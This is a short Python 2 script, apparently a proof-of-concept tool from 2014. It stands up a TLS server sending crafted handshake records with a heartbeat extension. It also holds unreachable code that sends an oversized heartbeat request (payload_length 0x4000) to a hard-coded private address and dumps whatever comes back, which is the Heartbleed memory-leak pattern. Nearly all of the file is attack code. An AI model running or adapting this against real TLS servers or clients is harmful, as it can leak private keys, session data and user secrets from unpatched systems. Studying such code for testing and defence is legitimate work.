'''
Created on Apr 24, 2014

@author: tintinweb

'''
from utils import *
from layer.ssl.tls import *
from layer.base import Raw,TCP,UDP

import sys



def main(opts):
    ip = opts['ip']
    port = opts['port']

    tcp = TCP(ip="0.0.0.0", port=443, buffer=16*1024, mode='server')
    print "build packet"


            
    
    ext = TLSExtensionList(extensions=TLSExtension()/TLSServerNameList()+
                                        TLSExtension()/TLSSessionTicket(data='N'*15+"I"*15+'\x00\x20'+'T'*0x20)+
                                        TLSExtension()/TLSHeartBeat.Handshake())
    
    # build server handshake
    version=TLSRecord.PROTOCOL_TLS_1_0
    server_hello = TLSRecord(version=version)/TLSHandshake(data=TLSServerHello(version=version,extensions=ext))
    certificate = TLSRecord(version=version)/TLSHandshake(data=TLSCertificate(certificates=TLSPropCertificate()+TLSPropCertificate()))
    ske = TLSRecord(version=version)/TLSHandshake(data=TLSServerKeyExchange())
    hello_done = TLSRecord(version=version)/TLSHandshake(data=TLSServerHelloDone(data='arg'))
    

    resp= tcp.recv(1024)  # wait for client

    
    print "<----",repr(TLSRecord(__raw=resp))
    resp = tcp/(server_hello+certificate+ske+hello_done)    
    print "<---",repr(TLSRecord(__raw=resp))
    exit()
    
    
    
    
    
    
    
    
    print "[ -> ] sending TLS Handshake"
    resp = tcp/Raw(data=serialize(TLSRecord(version=0x0302, content_type=0x16)/TLSHandshake(version=0x0302)))
    print "[ <- ] response: %s"%(len(resp) if resp else 0)
    hexdump_squashed(resp)
    print repr(TLSRecord(__raw=resp))
    
    print "[ -> ] sending TLS Handshake"
    resp = tcp/Raw(data=serialize(TLSRecord(version=0x0302)/TLSHeartBeat(payload_length=0x4000)))
    print "[ <- ] response: %s"%(len(resp) if resp else 0)
    if not resp:
        print "no response!"
        return

    hexdump_squashed(resp) 
    print repr(TLSRecord(__raw=resp))
    

if __name__=="__main__":
    opts = {'ip':'172.16.0.55',
            'port':443}
    main(opts)
    exit()